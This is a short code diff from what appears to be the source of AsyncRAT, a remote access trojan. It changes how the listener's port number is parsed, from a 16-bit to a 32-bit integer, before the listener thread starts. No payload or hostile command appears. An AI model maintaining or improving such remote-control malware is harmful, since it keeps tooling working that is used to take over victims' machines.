@@ -118,7 +118,7 @@ namespace AsyncRAT_Sharp
                         listener = new Listener();
                         Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                         thread.IsBackground = true;
-                        thread.Start(Convert.ToInt16(port.ToString().Trim()));
+                        thread.Start(Convert.ToInt32(port.ToString().Trim()));
                     }
                 }
             }
